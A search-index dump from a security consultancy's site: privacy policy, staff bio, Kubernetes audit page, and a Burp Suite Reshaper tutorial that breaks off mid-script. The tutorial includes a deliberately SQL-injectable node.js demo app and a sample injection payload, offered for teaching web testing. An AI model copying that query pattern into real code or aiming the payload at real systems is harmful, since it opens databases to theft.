[{"authors":null,"categories":null,"content":"Shelltrail AB, org.no. 559319-6164 (hereinafter denoted Shelltrail) is a Swedish based cybersecurity company predominantly active in the offensive IT security industry. This document is the privacy policy of Shelltrail, which explains how our organization uses the personal data we collect, use, maintain and disclose when you or the company you work for buys or uses the services we provide or when you contact us.\nTopics What data do we collect? How do we collect your data? How will we use your data? How do we store your data? Marketing What are your data protection rights? How do we use cookies? Privacy policies of other websites Changes to our privacy policy How to contact us How to contact the appropriate authorities What data do we collect? Shelltrail collects and processes data in order to be able to provide our services to you. The data is either provided by you or your employer as part of the delivery of a service, or as a means to contact you for future service offerings. Shelltrail collects the following data:\nWhen submitting data using our contact form\nIdentity information (name) Contact information (email address) As part of the delivery of our services\nIdentity information (name, title, company) Contact information (email address, telephone number) How do we collect your data? The data is collected by Shelltrail in the following ways:\nWhen submitting data using our contact form\nWhen submitting data using our contact form, the data is sent to a third-party provider (Cloudflare), which generates an email.\nAs part of the delivery of our services\nAs part of the delivery of our services, you or your employer may supply contact information.\nHow will we use your data? Shelltrail collects the data in order to communicate with you regarding your intention to get more information about our services or as part of an ongoing assignment.\nShelltrail also uses the data to verify your identity and authority to act on behalf of your employer or the organization you are representing.\nHow do we store your data? Shelltrail stores data in the following ways, depending on the way it has been retrieved:\nWhen submitting data using our contact form\nWhen submitting data using our contact form, the data is sent to a third-party provider (Cloudflare), which generates an email using Mailgun. This email is stored in an email inbox (gmail.com).\nAs part of the delivery of our services\nThe contact information supplied as part of the delivery of our services may either be stored in an email inbox (gmail.com) or in an encrypted ephemeral virtual machine, used solely for the purpose of the assessment.\nMarketing Shelltrail does not use the supplied information for marketing purposes.\nWhat are your data protection rights? Shelltrail would like to make sure you are fully aware of all of your data protection rights. Every user is entitled to the following:\nThe right to access - You have the right to request Shelltrail for copies of your personal data. The right to rectification - You have the right to request that Shelltrail corrects any information you belive is inaccurate. You also have the right to request Shelltrail to complete the information you belive is incomplete. The right to erasure - You have the right to request that Shelltrail erase your personal data, under certain conditions. The right to restrict processing - You have the right to object to Shelltrail\u0026rsquo;s processing of your personal data, under certain conditions. The right to data portability - You have the right to request that Shelltrail transfer all the data we have collected to another organization, or directly to you, under certain circumstances. If you make a request, we have one month to respond to you. If you would like to exercise any of these rights, please contact us at our email: privacy@shelltrail.com\nHow do we use cookies? Cookies are text files placed on your computer to collect standard Internet log information and visitor behavior information.\nShelltrail does not make use of cookies.\nPrivacy policies of other websites The Shelltrail website may contain links to other websites. Our privacy policy applies only to our website, so if you click on a link to another website, you should stay informed of their privacy policy.\nChanges to our privacy policy Shelltrail keep its privacy policy under regular review and places any updates on this web page. The privacy policy was last updated on 7th of August 2025.\nHow to contact us If you have any questions about Shelltrail\u0026rsquo;s privacy policy, the data we hold on you, or you would like to exercise one of your data protection rights, please do not hesitate to contact us.\nEmail: privacy@shelltrail.com\nAddress: Bredgatan 4, 21130, Malmö, Sweden\nHow to contact the appropriate authority Should you wish to report a complaint or if you feel that Shelltrail has not addressed your concern in a satisfactory manner, you may contact the Swedish Authority for Privacy Protection (IMY) https://www.imy.se.\n","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":-62135596800,"objectID":"0d173721cd0504c2391e2984cbee578c","permalink":"https://www.shelltrail.com/sv/privacy-policy/privacy-policy/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/sv/privacy-policy/privacy-policy/","section":"privacy-policy","summary":"Shelltrail AB, org.no. 559319-6164 (hereinafter denoted Shelltrail) is a Swedish based cybersecurity company predominantly active in the offensive IT security industry. This document is the privacy policy of Shelltrail, which explains how our organization uses the personal data we collect, use, maintain and disclose when you or the company you work for buys or uses the services we provide or when you contact us.\nTopics What data do we collect? How do we collect your data?","tags":null,"title":"Shelltrail Privacy Policy","type":"privacy-policy"},{"authors":null,"categories":null,"content":"Robin har haft ett stort intresse för cybersäkerhet så länge han kan minnas. Utöver att ha plockat sönder system och hittat sårbarheter i olika företag, har han spelat CTF:er i flera stora tävlingar, där han representerat både Sverige och andra lag.\nCertifieringar:\nOffensive Security Certified Professional (OSCP) ","date":1754524800,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1754524800,"objectID":"2453f8c2da53b6a298de4ca591a20c61","permalink":"https://www.shelltrail.com/sv/medarbetare/robin/","publishdate":"2025-08-07T00:00:00Z","relpermalink":"/sv/medarbetare/robin/","section":"medarbetare","summary":"IT-Säkerhetskonsult","tags":null,"title":"Robin Karlberg","type":"medarbetare"},{"authors":null,"categories":null,"content":"Kubernetes är ett vanligt förkommande orkestreringsverktyg för mikrotjänster som tillhandahåller skalbarhet och tillgänglighet för container-baserade applikationer. Vare sig det gäller interna policys eller regulatoriska krav, så är det alltid bra att utföra säkerhetsgranskningar för att proaktivt hitta sårbarheter eller felkonfigurationer. Detta kan minska sannolikheten för att ett intrång kommer ske och minimera påverkan om det händer.\nVad ingår i en säkerhetsgranskning av Kubernetes? När en Kubernetes säkerhetsgranskning utförs så kan utgångsläget variera, vanligt färkommande är att man utgår från perspektivet av en kapad pod, ett kapat namespace eller en kompromitterad anställd med utvecklaråtkomst. Utifrån dessa perspektiv så utnyttjas pubilkt kända attacker eller tekniker i ett försök att nå känslig information eller att kapa hela Kubernetes klustret.\nUtöver manuella tester så kommer en CIS benchmark användas som grund för att säkerställa att bästa säkerhetspraxis utvärderas i miljön. Center for Internet Security (CIS) är en ideell organisation som förbättrar beredskapen inom cybersäkerhet för både den offentliga och privata sektorn. CIS tillhandahåller omfattande checklistor, skapade av branchexperter, för att för att utvärdera om säkerhetskonfigurationer lever upp till bästa praxis.\nLeverabler efter att ha genomfört en säkerhetsgranskning Vid slutet av säkerhetsgranskningen kommer ett avslutande möte att hållas för att presentera uppdragets resultat, diskutera rekommendationer och svara på eventuella övriga frågor. Efter det avslutande mötet kommer rapporten att levereras, vilken innehåller tre sektioner: sammanfattning för ledning, uppdragsbeskrivning och resultat med rekommendationer. Den inledande sammanfattningen används ofta som ett utdrag från rapporten som kan presenteras för kunder. Detta kan visa på ett företags proaktivta arbete inom IT-säkerhetsområdet.\nKontakt Om du vill se ett exempelrapport eller diskutera/boka ett uppdrag, använd vårt kontaktformulär eller kontakta oss via e-post på info@shelltrail.com.\n","date":1714953600,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1714953600,"objectID":"14f41b911c1d986bfbf1b969f1889091","permalink":"https://www.shelltrail.com/sv/cybersakerhetstjanster/kubernetes-sakerhetsgranskning/","publishdate":"2024-05-06T00:00:00Z","relpermalink":"/sv/cybersakerhetstjanster/kubernetes-sakerhetsgranskning/","section":"cybersakerhetstjanster","summary":"En Kubernetes säkerhetsgranskning riktar sig åt att utvärdera det aktuella säkerhetsläget i ett företags Kubernetes miljö. Målet är att identifiera områden där förbättringar kan göras för att öka den övergripande säkerhetsställningen och proaktivt hitta sårbarheter som kan påverka systemets integritet, tillgänglighet eller konfidentialitet.","tags":["Kubernetes säkerhetsgranskning","microservices","mikrotjänster","k8s","container orkestrering","container säkerhet"],"title":"Säkerhetsgranskning av Kubernetesmiljö","type":"cybersakerhetstjanster"},{"authors":null,"categories":null,"content":" TL;DR This research will guide you through how to handle complex flows using the Reshaper plugin when performing web application security testing with Burp Suite. Even though Burp Suite arguably is the best proxy in the business - it falls short in certain tasks where the Reshaper plugin (developed by ddwightx) will shine.\nThis research may be used as a reference or baseline when building your Reshaper rules or a training ground to improve your Burp skills.\nIn total 6 scenarios will be displayed where all of them have an accompanied demo application:\nScenario 1 - Resending CSRF tokens which changes on each request with Burp Scenario 2 - Using Burp to increment values with Reshapers Evaluate action Scenario 3 - Using Burp with custom scripting via Reshapers JavaScript engine Scenario 4 - URL and base64 encoding Scenario 5 - Using Burp with command line tools with Reshapers Run Process Scenario 6 - Using Burp and Reshaper to perform multiple request and save PDF files to disk Scenario 7 - gRPC from the abyss While some of these scenarios can be solved with other solutions such as Mitmproxy, Hackvertor or Burp macros, this plugin gives more versatility.\nAnd a big shout out to @ddwightx for making all of these stunts available via Reshaper. Big thanks!\nBackground How many times have you had issues with handling CSRF tokens in a web assessment? What if you were told that this have been possible all along with the lesser known plugin called Reshaper?\nIt is powerful, extremely powerful. The popularity of this plugin is oddly enough low, maybe because of its complexity and limited guides and detailed setup steps.\nWe will show you how to utilize this plugin in some common scenarios where the standard Burp Suite lacks the capability.\nReshaper introduction When installed Reshaper provides a new tab in burp with multiple sub tabs:\nMost time will be spent in the HTTP rules sub tab as it is here you configure what actions the plugin should perform.\nLet\u0026rsquo;s start with a simple task such as setting a comment named testing on HTTP requests.\nUse the add button to create a new rule. In the Whens frame give it a name and choose the event direction of the rule. As we want to trigger on outgoing traffic we choose request as direction.\nThe next step is the provide what the action,Thens, will be when matching the Whens:\nChoose comment and add. Specify a name, check enabled an finish off with save.\nWe are now done. All request passing through Burp will have the comment \u0026ldquo;testing\u0026rdquo;. Nice.\nNow we want to change the Whens to only perform actions when the request is sent to a specific path i.e /user. Any of the following matches text will be sufficient:\nSource Message Value Source Value Type Match Text Request URI Path Text /user Request URI Text /user Request Status Line Text GET /user HTTP/1.1 URL Text http://localhost:3000/user The following setup will successfully comment a request with a status line of GET /user HTTP/1.1\nMore advanced rules can be performed such as matching if a JSON key value pair exists in the request body (be mindful that the Source Value Path and Match Text should not include quotation):\nThe following picture is an example request that will be matched by our rule:\nCool. Now we have a basic knowledge how to configure Reshaper. Lets dive in to some interesting scenarios.\nScenario 1 - Resending CSRF tokens which changes on each request with Burp Alright, we know the basics of how to configure Reshaper. Let\u0026rsquo;s put it to the test on a demo application.\nThe demo application is an API application hosted with node.js. Save this code as app.js and run it with node app.js:\n// mkdir $HOME/node-api-csrf // cd $HOME/node-api-csrf // npn init -y // npm install express uuid const express = require(\u0026#39;express\u0026#39;); const { v4: uuidv4 } = require(\u0026#39;uuid\u0026#39;); const app = express(); app.use(express.json()); // Middleware to parse JSON bodies // In-memory \u0026#34;database\u0026#34; const users = []; // CSRF tokens store const csrfTokens = new Map(); // Middleware to check CSRF token function checkCsrfToken(req, res, next) { const csrfToken = req.headers[\u0026#39;csrf-token\u0026#39;]; if (!csrfToken || !csrfTokens.has(csrfToken)) { const newToken = uuidv4(); csrfTokens.set(newToken, true); res.setHeader(\u0026#39;CSRF-Token\u0026#39;, newToken); // Provide a valid CSRF token in response header return res.status(403).json({ error: \u0026#34;Invalid CSRF token\u0026#34; }); } // CSRF token is valid, let\u0026#39;s remove it and proceed csrfTokens.delete(csrfToken); next(); } // Route to add a user app.post(\u0026#39;/user\u0026#39;, checkCsrfToken, (req, res) =\u0026gt; { const { name } = req.body; if (!name) { return res.status(400).json({ error: \u0026#39;Name is required\u0026#39; }); } users.push(name); // Storing the name in \u0026#34;database\u0026#34; const newToken = uuidv4(); csrfTokens.set(newToken, true); res.setHeader(\u0026#39;CSRF-Token\u0026#39;, newToken); // Provide a valid CSRF token in response header res.status(201).send(\u0026#39;User added\u0026#39;); }); // Starting the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); The end-user can send a JSON formatted POST body to /user endpoint which adds a name to the in-memory database. The request will only be successful if the end-user provides CSRF token which is randomly generated and returned to the user as a HTTP response header.\nIf we would want to use Burp\u0026rsquo;s built in active scanner to look for vulnerabilities this would be a problem as we need to provide the CSRF token upon each request.\nTo circumvent this problem we create a new Reshaper rule called \u0026ldquo;set_csrf_variable\u0026rdquo; and configure the Whens with Request Direction = Response and actions as the example shown in the following table:\nRequest Direction Whens Source Message Value Source Identifier Identifier Placement Source Value Type Match Type Match Text Response Matches Text Response Header CSRF-Token Last Text Regex .+ The Regexp .+ matches any sequence of characters that is at least one character long which makes sure the Response Header CSRF-Token is not empty.\nFor the Thens part we want to store our CSRF-Token in a variable:\nRequest Direction Thens Source Message Value Source Identifier Identifier Placement Source Value Type Destination Variable Source Destination Variable Name Destination Variable Name N/A Set Variable Response Header CSRF-Token Last Text Global csrf_variable Text This rule will, for every response that has CSRF-Token set as a header, fetch the token value and save it to a variable named csrf_variable.\nThe result should look like this:\nNow, when sending a request to the server via Burp, a variable will be created or updated in the Global Variables sub tab of Reshaper:\nNext step is to use this csrf_variable in subsequent request. We do by creating a new rule called set_csrf with event direction request and by using the Set Value as a Whens action according to the following tables:\nRequest Direction Whens Source Message Value Source Value Type Match Type Match Text Request Matches Text URL Text Equals http://localhost:3000/user Request Direction Thens Source Text Source Type Value Destination Message Value Destination Identifier Destination Identifier Placement Destination Type Value N/A Set Value {{g:csrf_variable}} Text Request Header CSRF-Token Only Text The result should look like this:\nIf all steps are followed correctly every response that contains a CSRF-Token will will be saved as a variable which will be referenced and used in all upcoming request to http://localhost:3000/user. This makes it possible to, for instance, use Burp active scanner where CSRF tokens need to be provided.\nQuite powerful innit.\nBut now you went all this way only find out that your CSRF token is provided via cookies and not HTTP headers? Not a problem. Replace the references to Request Header and Response Header to Request Cookie and Response Cookie.\nScenario 2 - Using Burp to increment values with Reshapers Evaluate action In the previous scenario we configured Reshaper to fetch a value from a response and the use that value in subsequent requests which works perfectly when assessing applications with CSRF tokens.\nNow we will demonstrate another hurdle that Reshaper can help bypass, namely incrementing values.\nFor this demonstration we will yet again use an API hosted by node.js that takes user input in JSON format and stores in memory.\n// mkdir $HOME/node-api-version // cd $HOME/node-api-version // npn init -y // npm install express const express = require(\u0026#39;express\u0026#39;); const app = express(); const PORT = process.env.PORT || 3000; app.use(express.json()); // In-memory storage let userData = { name: null, version: 0 }; app.post(\u0026#39;/user\u0026#39;, (req, res) =\u0026gt; { const { name, version } = req.body; if (name \u0026amp;\u0026amp; version !== undefined) { if (version \u0026gt; userData.version) { userData.name = name; userData.version = version; return res.status(200).json({ message: \u0026#34;User data updated\u0026#34;, data: userData }); } else { return res.status(400).json({ error: \u0026#34;A newer version exists. Please update the version number.\u0026#34; }); } } else { return res.status(400).json({ error: \u0026#34;Both name and version are required\u0026#34; }); } }); app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); The end-user can send a JSON formatted POST body to /user endpoint which updates the name key on the server with the provided value. The request is only successful if the end-user provides a valid version number, which is increased every time the name is updated.\nPOST /user HTTP/1.1 Host: localhost Content-Type: application/json Content-Length: 31 { \u0026#34;name\u0026#34;:\u0026#34;user1\u0026#34;, \u0026#34;version\u0026#34;:1 } This obstacle would be a problem for Burp\u0026rsquo;s active scanner or let alone be a time consuming task overcoming manually when using Burp\u0026rsquo;s repeater.\nWe circumvent this by creating a new Reshaper rule called set_version_variable and configure the Whens to either of the following examples in the table which shows how to match text or JSON key values:\nRequest Direction Whens Source Message Value Source Value Type Source Value Path Match Type Match Text Response Matching Text Response Body Text N/A Contains \u0026ldquo;version\u0026rdquo;: Response Matching Text Response Body JSON data.version Regex [0-9] The usage of quotation with version in the first example is because we are now looking for a string in the response body which is quoted.. The reason for using data.version in the second example is because the response from the server is nested JSON, as in: HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 { \u0026#34;message\u0026#34;:\u0026#34;User data updated\u0026#34;, \u0026#34;data\u0026#34;:{ \u0026#34;name\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;version\u0026#34;:14 } } For the Thens we configure it as follows:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body JSON data.version Global version_variable Text This should make sure that we have the current version number stored in a variable in Burp. However, this must be increased by 1 because every time the name parameter is updated we need to provide a new version number.\nWe accomplish this by using the Evaluate action in Reshaper:\nRequest Direction Whens X Operation Y Destination Variable Source Destination Variable Name N/A Evaluate {{g:version_variable}} Add 1 Global version_variable_incremented The result should look like this:\nAnd the Evaluate action:\nNow, when sending a request to the server with a correct version number, two variables should be created in the Global Variables sub tab of Reshaper:\nNext step is to replace the version key-value in subsequent requests with the version_variable_incremented. We can perform this by creating a new rule with event direction request and by using the Set Value action according to the following image:\nIf all steps are followed correctly every request that contains a JSON key-value pair with the name version, with data as a digit and is sent to http://localhost:3000/user will have it\u0026rsquo;s version key-value replaced with our variable version_variable_increased. Great success.\nScenario 3 - Using Burp with custom scripting via Reshapers JavaScript engine This incrementation done by the Evalute action done in the previous scenario can also be perform with JavaScript. This scenarion will display the richness and customizability by using Reshapers JavaScript engine.\nSo instead of using the Evaluate setup in the previous example we replace it with Run Script. \u0026ldquo;Script\u0026rdquo; refers to JavaScript whereas Run Process can run execute python, ruby or bash scripts stored on the file system.\nThe following setup will use Run Script instead of Evaluate in the set_version_variable rules:\nWhens:\nRequest Direction Whens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type Request Match text Response Body JSON data.version Global version_variable Text Thens:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body JSON data.version Global version_variable Text Instead of the Evaluate action we add Run Script with the following JavaScript code:\nvar version = Reshaper.variables.getGlobalVariable(\u0026#34;version_variable\u0026#34;); let verint = parseInt(version, 10); verint += 1; Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: verint, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;version_variable_incremented\u0026#34; } ); When configured it should look like this:\nThe JavaScript fetches the version_variable data and converts it to an int which is incremented and stored in a variable named version_variable_incremented.\nBy knowing how to fetch and store variables with Reshapers JavaScript Engine opens up for unlimited flexibility.\nScenario 4 - URL and base64 encoding New scenario new possibilities. Hackvertor is an awesome extension when is comes to converting and encoding data. All of these action can also be done with Reshaper which will be demonstrated in this scenario.\nThe following node.js application code is vulnerable to SQL injection, the caveat however is that the input is required to be base64 encoded. Compared to previous scenarios this demonstration application use form-urlencoding instead of JSON input to mix things up a bit.\n// mkdir $HOME/node-api-sqli // cd $HOME/node-api-sqli // npm init -y // npm install express sqlite3 body-parser const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const sqlite3 = require(\u0026#39;sqlite3\u0026#39;).verbose(); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: false })); // Initialize the in-memory SQLite database const db = new sqlite3.Database(\u0026#39;:memory:\u0026#39;, (err) =\u0026gt; { if (err) { return console.error(err.message); } console.log(\u0026#39;Connected to the in-memory SQLite database.\u0026#39;); }); // Create a users table and insert some sample data db.serialize(() =\u0026gt; { db.run(\u0026#39;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL)\u0026#39;); db.run(\u0026#34;INSERT INTO users (name) VALUES (\u0026#39;Alice\u0026#39;), (\u0026#39;Bob\u0026#39;), (\u0026#39;Charlie\u0026#39;)\u0026#34;); }); // Middleware to decode base64 and URL encoding app.use((req, res, next) =\u0026gt; { if (req.method === \u0026#39;POST\u0026#39;) { if (typeof req.body.data === \u0026#39;string\u0026#39;) { try { let decodedData = decodeURIComponent(Buffer.from(req.body.data, \u0026#39;base64\u0026#39;).toString(\u0026#39;ascii\u0026#39;)); req.decodedInput = decodedData; next(); } catch (e) { res.status(400).send(\u0026#39;Invalid input. Please ensure your input is base64 and URL encoded.\u0026#39;); } } else { res.status(400).send(\u0026#39;Invalid input format.\u0026#39;); } } else { next(); } }); // Vulnerable SQL route app.post(\u0026#39;/search\u0026#39;, (req, res) =\u0026gt; { let query = `SELECT * FROM users WHERE name = \u0026#39;${req.decodedInput}\u0026#39;`; db.all(query, [], (err, rows) =\u0026gt; { if (err) { return res.status(500).send(\u0026#39;Error executing SQL query.\u0026#39;); } res.json(rows); }); }); app.listen(port, () =\u0026gt; { console.log(`Server running on http://localhost:${port}`); }); By supplying Alice' or '1'=1 base64 encoded in the data parameter the full database is dumped:\nThis SQL injection is very trivial to exploit and much more complex payloads may be needed in live environments. When testing and construction these payloads it may be time consuming to base64 decode or encode at every attempt.\nFor this we will use Reshaper to:\nFetch payload from the data parameter in our request body and store it in a variable named payload_plain_text Use the JavaScript engine to base64 encode our payload_plain_text data and store that as a new variable named payload_base64 Replace the data request body parameter with the payload stored in the payload_base64 variable Request Direction Whens Source Message Value Source Value Type Source Value Path Match Type Match Text Response Matching Text Request Body Params data Regexp .+ Request Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Request Body Params data Global payload_plain_text Text Next we will add run a custom JavaScript that fetches the payload_plain_text, base64 encodes it and saves it to payload_base64\nRun Script:\nvar Base64 = { // private property _keyStr : \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;, // public method for encoding encode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; input = Base64._utf8_encode(input); while (i \u0026lt; input.length) { chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 \u0026gt;\u0026gt; 2; enc2 = ((chr1 \u0026amp; 3) \u0026lt;\u0026lt; 4) | (chr2 \u0026gt;\u0026gt; 4); enc3 = ((chr2 \u0026amp; 15) \u0026lt;\u0026lt; 2) | (chr3 \u0026gt;\u0026gt; 6); enc4 = chr3 \u0026amp; 63; if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; } output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4); } return output; }, // public method for decoding decode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \u0026#34;\u0026#34;); while (i \u0026lt; input.length) { enc1 = this._keyStr.indexOf(input.charAt(i++)); enc2 = this._keyStr.indexOf(input.charAt(i++)); enc3 = this._keyStr.indexOf(input.charAt(i++)); enc4 = this._keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 \u0026lt;\u0026lt; 2) | (enc2 \u0026gt;\u0026gt; 4); chr2 = ((enc2 \u0026amp; 15) \u0026lt;\u0026lt; 4) | (enc3 \u0026gt;\u0026gt; 2); chr3 = ((enc3 \u0026amp; 3) \u0026lt;\u0026lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) { output = output + String.fromCharCode(chr2); } if (enc4 != 64) { output = output + String.fromCharCode(chr3); } } output = Base64._utf8_decode(output); return output; }, // private method for UTF-8 encoding _utf8_encode : function (string) { string = string.replace(/\\r\\n/g,\u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }, // private method for UTF-8 decoding _utf8_decode : function (utftext) { var string = \u0026#34;\u0026#34;; var i = 0; var c = c1 = c2 = 0; while ( i \u0026lt; utftext.length ) { c = utftext.charCodeAt(i); if (c \u0026lt; 128) { string += String.fromCharCode(c); i++; } else if((c \u0026gt; 191) \u0026amp;\u0026amp; (c \u0026lt; 224)) { c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c \u0026amp; 31) \u0026lt;\u0026lt; 6) | (c2 \u0026amp; 63)); i += 2; } else { c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c \u0026amp; 15) \u0026lt;\u0026lt; 12) | ((c2 \u0026amp; 63) \u0026lt;\u0026lt; 6) | (c3 \u0026amp; 63)); i += 3; } } return string; } } var snus = Base64.encode(Reshaper.variables.getGlobalVariable(\u0026#34;payload_plain_text\u0026#34;)); Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: snus, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;payload_base64\u0026#34; } ); And to finish up, we\u0026rsquo;ll use the Set Value action to replace the payload in the data parameter that will be sent to the server:\nRequest Direction Thens Source Text Source Type Value Destination Message Value Destination Value Type Destination Identifier Placement Destination Value Path N/A Set Value {{g:payload_base64}} Text Request Body Params N/A data The three steps should be inserted in the following order:\nNow we can write our payloads in plain text and let Reshaper convert our input:\nAwesome, we can now on the fly base64 encode data in form-url parameters. This is certainly useful.\nScenario 5 - Using Burp with command line tools with Reshaper Run Process Alright, so in the previous example we implemented a base64 encoder in JavaScript to handle encoding of input to perform a SQL injection attack.\nIn this scenario we will continue build upon our base64 encoder but this time we will use it with the Run Process action in Reshaper. This will help us send complex data structures from Burp into a custom command-line tool, which will be used in upcoming HTTP requests.\nFor this demonstration we will use a web application that only accepts input if the input data is provided with a valid signature. The signature is verified with the node-rsa package.\nWe will continue using form-urlencoding as our input to further familiarize ourself with the concept.\nSetup the environment and store as app.js:\n// mkdir $HOME/node-api-sign // cd $HOME/node-api-sign // npn init -y // npm install express body-parser node-rsa // openssl rsa -pubout -in private_key.pem -out public_key.pem const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const NodeRSA = require(\u0026#39;node-rsa\u0026#39;); const app = express(); const port = 3000; // Use bodyParser to parse application/x-www-form-urlencoded bodies app.use(bodyParser.urlencoded({ extended: true })); // Load the public key from file const publicKey = fs.readFileSync(\u0026#39;public_key.pem\u0026#39;, \u0026#39;utf8\u0026#39;); const key = new NodeRSA(); key.importKey(publicKey, \u0026#39;public\u0026#39;); app.post(\u0026#39;/user\u0026#39;, (req, res) =\u0026gt; { let { name, signature } = req.body; if (!name || !signature) { return res.status(400).send(\u0026#39;Missing name or signature.\u0026#39;); } // Correcting URL-decoded Base64 signature: replace spaces with plus signs signature = signature.replace(/\\s/g, \u0026#39;+\u0026#39;); // Verify the signature const isVerified = key.verify( name, Buffer.from(signature, \u0026#39;base64\u0026#39;), \u0026#39;utf8\u0026#39;, \u0026#39;base64\u0026#39; ); if (!isVerified) { return res.status(401).send(\u0026#39;Invalid signature.\u0026#39;); } res.send(`Name ${name} has been securely stored.`); }); app.listen(port, () =\u0026gt; { console.log(`Server running on http://localhost:${port}`); }); We will use the following python3 script (signer.py) to perform the signing of the input data that will be sent to the server. The script also includes a try statement that checks if the input to the script is base64 encoded or not. More on this later.\nfrom cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.primitives.serialization import load_pem_private_key import base64 import sys import os # pip3 install cryptography data = (sys.argv[1]).encode() try: # Attempt to decode the base64-encoded string data = base64.b64decode(data).decode(\u0026#39;utf-8\u0026#39;) data = data.encode() #print(\u0026#34;Input is base64\u0026#34;) except Exception as e: # If decoding fails, return the original string #print(\u0026#34;Input not base64\u0026#34;) pass # Load your private key dir_path = os.path.dirname(os.path.realpath(__file__)) key_path = os.path.join(dir_path, \u0026#39;private_key.pem\u0026#39;) with open(key_path, \u0026#34;rb\u0026#34;) as key_file: private_key = load_pem_private_key(key_file.read(), password=None) # Sign the data signature = private_key.sign( data, padding.PKCS1v15(), hashes.SHA256() ) # Encode the signature in base64 to simplify handling signature_base64 = base64.b64encode(signature).decode() print(signature_base64) $ python3 signer.py asdf bciDlo5cqYPWzVqPMp2L263c7wKh+21fauQBr2m1kV59S2J/hxu2lohZEiVmvwtIFxBYUkziMy0Hq33MCe3fSi7fj7CoWw5CWz95i5kxLQ01wAfsTKl5M207y9lpE6J0djYYGeidjhb6PsMm+BsoQFQ2mO09LJwMLPcEM8t2Geg7LEurlyzYBMJwtBQZB3eU4vTvWx/H0MDGdYi5jssF3GzRweXkEaopNHbrftaEEQye2uKQDdlm0+ublpmuVDsHVohosTBn74+j0LUZLCIgH/CHukh0dKL7c5YQKOdApYuwsxL16xYDfG5uOvPZdjF3yryfxjm2b2Ru1uOTsjG8bA== $ curl -X POST -d \u0026#39;name=asdf\u0026amp;signature=bciDlo5cqYPWzVqPMp2L263c7wKh+21fauQBr2m1kV59S2J/hxu2lohZEiVmvwtIFxBYUkziMy0Hq33MCe3fSi7fj7CoWw5CWz95i5kxLQ01wAfsTKl5M207y9lpE6J0djYYGeidjhb6PsMm+BsoQFQ2mO09LJwMLPcEM8t2Geg7LEurlyzYBMJwtBQZB3eU4vTvWx/H0MDGdYi5jssF3GzRweXkEaopNHbrftaEEQye2uKQDdlm0+ublpmuVDsHVohosTBn74+j0LUZLCIgH/CHukh0dKL7c5YQKOdApYuwsxL16xYDfG5uOvPZdjF3yryfxjm2b2Ru1uOTsjG8bA==\u0026#39; http://localhost:3000/user Awesome, our demo application works:\nLets say we want to use Burps intruder to fuzz to name parameter. We begin by creating a Reshaper rule for when it should trigger:\nRequest Direction Whens Source Message Value Source Value Type Source Value Path Match Type Match Text Request Matching Text Request Body Params name Regexp .+ We\u0026rsquo;ll store our input parameter name as a variable named name_input:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Request Body Params data Global name_input Text Next we take our name_input variable and base64 encode it much like we did in scenario 4. We store the base64 value in a variable named name_input_base64:\nRun Script:\nvar Base64 = { // private property _keyStr : \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;, // public method for encoding encode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; input = 